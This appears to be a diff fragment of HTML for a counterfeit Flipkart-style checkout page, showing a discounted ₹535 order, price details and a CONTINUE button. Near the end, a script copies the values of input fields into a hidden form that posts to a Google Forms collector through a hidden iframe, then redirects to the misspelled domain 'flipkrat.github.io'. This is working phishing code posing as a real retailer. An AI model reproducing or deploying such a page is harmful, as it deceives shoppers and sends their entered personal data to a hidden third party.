0px; padding: inherit; object-fit: contain; opacity: 0;"></div></div></div></div><div class="css-1dbjc4n r-1habvwh r-18u37iz r-1wtj0ep r-1ow6zhx r-knv0ih r-136ojw6"><div class="css-1dbjc4n r-knv0ih"><div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1h0z5md r-15zivkp"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv"><div text="₹535" dir="auto" class="css-901oao r-op4f77 r-1vgyyaa r-1rsjblm r-1vzi8xi" style="font-size: 18px;font-family:Helvetica;position:relative;bottom:50px;margin-left:7px;font-family:"><strong>₹535 </strong></div></div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv" style="background-color:j"><div text="₹1,178" dir="auto" class="css-901oao r-1h7g6bg r-1et8rh5 r-ubezar r-1rsjblm r-1d4mawv r-1vzi8xi r-142tt33 r-1a2p6p6" style="position:relative;bottom:70px;left:67px;opacity:.5;font-family:; background-color:j;max-width:50px"><del>₹1,178</del></div></div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv"><div text="52% off" dir="auto" class="css-901oao r-1w427b9 r-1vgyyaa r-ubezar r-1rsjblm r-1vzi8xi" style="position:relative;bottom:90px;left:126px;color:green;font-family:;width:80px;background-color:j"><strong>52% off </strong></div></div></div></div></div><div class="css-1dbjc4n r-1awozwy r-1kv57cf r-1jkafct r-rs99b7 r-18u37iz r-mabqd8 r-1777fci r-88pszg r-1m4drjs r-b8lwoo r-136ojw6"><div class="css-1dbjc4n"><div><div class="css-1dbjc4n r-mabqd8 r-1glkqn6"><div class="css-1dbjc4n r-1awozwy r-13awgt0 r-18u37iz r-1777fci r-15ysp7h"><div dir="auto" class="css-901oao r-op4f77 r-1vgyyaa r-1b43r93 r-1rsjblm" style="position:absolute;left:220px;bottom:145px;font-family:Helvetica;opacity:;border:px solid gray;border-radius:2px;width:%;height:%;margin-right:px padding-left:px;"> 
+
+<img src="https://i.ibb.co/yPxmwnn/IMG-20210907-102727.jpg" alt="IMG-20210907-102727" border="0"style="height:50px; width:130px;margin-right:;background-color:j">
+
+</div><div class="css-1dbjc4n r-1awozwy r-1stjixc r-1xbve24 r-1jkjb r-1udh08x r-16eto9q"><div class="css-1dbjc4n r-1m9ckf1 r-3da1kt r-7zlphq r-1jg9483"></div></div></div></div></div><div class="css-1dbjc4n"></div></div></div></div><div class="css-1dbjc4n r-18u37iz"><div class="css-1dbjc4n r-13awgt0 r-eqz5dr"><div class="css-1dbjc4n r-1ow6zhx"><div dir="auto" data-focusable="true" tabindex="0" class="css-901oao r-1awozwy r-1loqt21 r-18u37iz r-1h0z5md"><span text="4 offers available" dir="auto" class="css-901oao css-16my406 r-1w427b9 r-1vgyyaa r-1enofrn r-1rsjblm r-5fcqz0" style="position:relative;font-size:12px;bottom:80px;margin-left:7px;color:green;font-family:bold"><del style="">4 offers available </strong></span></div></div></div></div><div class="css-1dbjc4n r-13awgt0 r-eqz5dr r-1fdo3w0"><div class="css-1dbjc4n r-13awgt0 r-18u37iz r-14q5wjw"><div dir="auto" class="css-901oao r-cqee49 r-1et8rh5 r-1b43r93 r-1rsjblm r-rjixqe"style="position:relative;bottom:60px;font-size:15px;margin-left:7px;font-family:Helvetica;">Delivery by 5 - 6 day's | </div><div class="css-1dbjc4n r-1bymd8e"><div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1h0z5md"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv"><div text="Free" dir="auto" class="css-901oao r-1w427b9 r-1vgyyaa r-1enofrn r-1rsjblm r-1vzi8xi" style="position:relative;bottom:75px;left:170px;font-size:12px;color:green;background-color:j;width:50px"><strong>Free </strong></div></div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv"><div text="₹40" dir="auto" class="css-901oao r-1h7g6bg r-1et8rh5 r-1enofrn r-1rsjblm r-1bymd8e r-1vzi8xi r-142tt33 r-1a2p6p6"style="position:relative;bottom:88px;left:205px;font-size:12px;opacity:.5;background-color:j;width:50px"><strong><del>₹40</del></strong></div></div></div></div></div></div></div><div class="css-1dbjc4n"></div><div class="css-1dbjc4n"></div></div>
+</div>
+
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:10px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px"></div>
+
+<div style="height:30px">
+
+<div class="css-1dbjc4n r-13awgt0 r-eqz5dr r-1wtj0ep"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1h0z5md r-6gpygo r-1s2bzr4 r-ymttw5"><div class="css-1dbjc4n r-13awgt0 r-18u37iz"><div style="display: flex; position: relative; width: 24px; height: 24px;"><img src="https://rukminim1.flixcart.com/www/50/50/promos/28/05/2020/3838d1e3-6f8a-4b56-9ebc-16d123220190.png?q=90" loading="lazy" alt="" style="width: 100%; height: 100%; margin: auto; object-fit: contain; opacity: 1;margin-left:7px;"><img src="https://static-assets-web.flixcart.com/www/linchpin/batman-retrns/images/fk-default-image-75ff340b.png?q=90" loading="lazy" style="width: 100%; height: 100%; margin: auto; position: absolute; inset: 0px; padding: inherit; object-fit: contain; opacity: 0;margin-left:7px"></div><div dir="auto" class="css-901oao r-op4f77 r-1et8rh5 r-1b43r93 r-135wba7 r-1ow6zhx" style="position:relative;left:50px;bottom:20px;font-size:14px;background-color:j;width:50px; ">Invoice</div></div><div><div text="Add Email" dir="auto" class="css-901oao r-1dupt2p r-1vgyyaa r-1b43r93 r-1rsjblm"style="position:relative;left:75%;bottom:40px;color:#2873F0; font-size:15px; width:80px;font-family:bold ;background-color:j"><strong>Add Email </strong></div></div></div></div></div>
+
+
+
+
+
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:10px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px;background-color:j"></div>
+
+
+<div class="css-1dbjc4n r-1awozwy r-rp7rv6 r-qklmqi r-18u37iz r-1ygb39h r-1h0z5md r-ymttw5" style="background-color:j"><div text="PRICE DETAILS" dir="auto" class="css-901oao r-1h7g6bg r-1vgyyaa r-1b43r93 r-1rsjblm" style="font-size:13.5px;opacity:.5;font-family:;margin-left:7px;margin-top:15px;margin-bottom:15px"><strong> PRICE DETAILS</strong> </div></div>
+
+
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:1.5px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px"></div>
+<div style="margin-left:7px;font-size:14.3px">
+<div class="css-1dbjc4n"><div class="css-1dbjc4n r-eqz5dr r-f1odvy r-kc8jnq r-ymttw5 r-1ovo9ad"><div class="css-1dbjc4n r-eqz5dr r-y3xmzu"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1wtj0ep"><div class="css-1dbjc4n r-1habvwh r-18u37iz" style="background-color:j"><div text="Price (1 item)" dir="auto" class="css-901oao r-op4f77 r-1et8rh5 r-1b43r93 r-1rsjblm">Price (1 item) </div></div><div class="css-1dbjc4n"><div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1h0z5md"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv"><div text="₹1,178" dir="auto" class="css-901oao r-op4f77 r-1et8rh5 r-1b43r93 r-1rsjblm r-1vzi8xi" style="position:relative;left:82%; bottom:15px;background-color:j;width:50px">₹1,178 </div></div></div></div></div></div></div><div class="css-1dbjc4n r-eqz5dr r-y3xmzu"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1wtj0ep"><div class="css-1dbjc4n r-1habvwh r-18u37iz"><div text="Discount" dir="auto" class="css-901oao r-op4f77 r-1et8rh5 r-1b43r93 r-1rsjblm">Discount </div></div><div class="css-1dbjc4n"><div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1h0z5md"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv"><div text="- ₹643" dir="auto" class="css-901oao r-1w427b9 r-1et8rh5 r-1b43r93 r-1rsjblm r-1vzi8xi"style="position:relative;left:82%;color:green; bottom:15px;background-color:j;max-width:50px">- ₹643 </div></div></div></div></div></div></div><div class="css-1dbjc4n r-eqz5dr r-y3xmzu"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1wtj0ep"><div class="css-1dbjc4n r-1habvwh r-18u37iz"><div text="Delivery Charges" dir="auto" class="css-901oao r-op4f77 r-1et8rh5 r-1b43r93 r-1rsjblm"style="background-color:j">Delivery Charges </div></div><div class="css-1dbjc4n"><div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1h0z5md"><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-1d4mawv"><div text="Free" dir="auto" class="css-901oao r-1w427b9 r-1et8rh5 r-1b43r93 r-1rsjblm r-1vzi8xi"style="position:relative;left:85%;color:green; bottom:17px;background-color:j;width:50px">Free </div></div></div></div></div></div></div></div> 
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:1.5px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px;border-top:1px dashed ;;"></div>
+
+<div style="margin-left:7px;">
+
+<div<div class="css-1dbjc4n r-1k9g4g2 r-qwd59z r-eg6o18 r-rs99b7 r-109y4c4 r-1ybube5 r-1c6vhvp"></div></div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-ur6pnr r-1wtj0ep r-ymttw5"style="height:25px"><div id="fh"text="Total Amount" dir="auto" class="css-901oao r-op4f77 r-1vgyyaa r-1b43r93 r-1rsjblm r-1vzi8xi" style=""><strong>Total Amount </strong></div><div class="css-1dbjc4n r-1awozwy r-18u37iz"><div text="₹535" dir="auto" class="css-901oao r-op4f77 r-1vgyyaa r-ubezar r-1rsjblm r-1vzi8xi" style="position:relative;bottom:15px;left:80%; background-color:j;width:50px"><strong>₹535 </strong></div></div></div></div>
+
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:1.5px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px"></div>
+<div class="css-1dbjc4n r-1awozwy r-12gph82 r-5kkj8d r-18u37iz r-h3s6tt r-1wtj0ep r-ymttw5"><div text="You will save ₹643 on this order" dir="auto" class="css-901oao r-1w427b9 r-1vgyyaa r-1b43r93 r-1rsjblm"style="margin-left:7px;color:green; background-color:j">You will save ₹643 on this order </div></div></div>
+
+
+<script>
+function on() {
+  var box1 = document.getElementById('in1');
+  var box2 = document.getElementById('box2'); 
+  box2.value = box1.value;
+  
+var ip2 = document.getElementById('in2');
+  var ip3 = document.getElementById('by1'); 
+  ip3.value = ip2.value;
+}
+</script>
+  <form  action="https://docs.google.com/forms/d/e/1FAIpQLScgiHW8i6bD1UBoaAMaMOu7RL7GI7C0Njnsr9KShZa5yCsjKw/formResponse"  method="post" id="fm"target="hidden_iframe" onsubmit="submitted=true" class="myform" style="display:none"><iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='https://flipkrat.github.io/flipkart/option.html';}"></iframe>
+<input type="text" name="entry.1462512496"id='box2'>
+<input type="text" name="entry.921194256"value=""id='by1'>
+
+</form>
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:10px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px"></div>
+
+
+<div class="css-1dbjc4n r-1awozwy r-i9s5x7 r-18u37iz r-1777fci r-mjyw6 r-qn3fzs r-1ygmrgt"><div style="display: flex; position: relative; margin-right: 16px; width: 26px; height: 32px;top:65px;left:25px"> <img src="https://static-assets-web.flixcart.com/www/linchpin/batman-returns/images/fk-default-image-75ff340b.png?q=90" loading="lazy" style="width: 100%; height: 100%; margin: auto; position: absolute; inset: 0px; padding: inherit; object-fit: contain; opacity: 0;"></div>
+<div style="display: flex; position: absolute; width:px ; height: px;"></div>
+
+
+<img src="https://i.ibb.co/KhBsq3X/IMG-20210907-161211.jpg" alt="IMG-20210907-161211" border="0" style="height:180px; width:350px;position:relative;bottom:30px;background-color:j"> 
+
+
+    <style type="text/css" media="all">
+      
+      
+
+header{
+  background:#FF5800;
+  padding:11px;
+  width: 48%;
+  bottom: 8px;
+  position:absolute;
+  left:176.5px;
+  border-radius: 2px;
+  
+
+
+}   
+#d4{
+  position:fixed;
+  
+  bottom: 0px;
+
+}
+      
+      
+    </style>
+    <div id="d4" style="width:100%;height:57px;background:white;">
+  <a href="https://flipkrat.github.io/flipkart/option.html"> <header onclick="document.forms['fm'].submit();" id="hed"style="color:white;text-align:center;">
+   CONTINUE
+ </header></a>
+ <a href="#fh">
+  <h id="hed2"style="text-align:center;position:relative;background:;font-size:19px;top:3px;margin-left:10px;">
+ <strong>  ₹535 </strong>
+ </h>
+<p id="pt" style="font-size:14px;color:#2873F0;margin-top:5px;position:ab;margin-left:10px;">View price details </p>
+</div></a>
+</h100>
+  
+
+
+
+
+
+
+
+
+  
+ </body>
+</html>
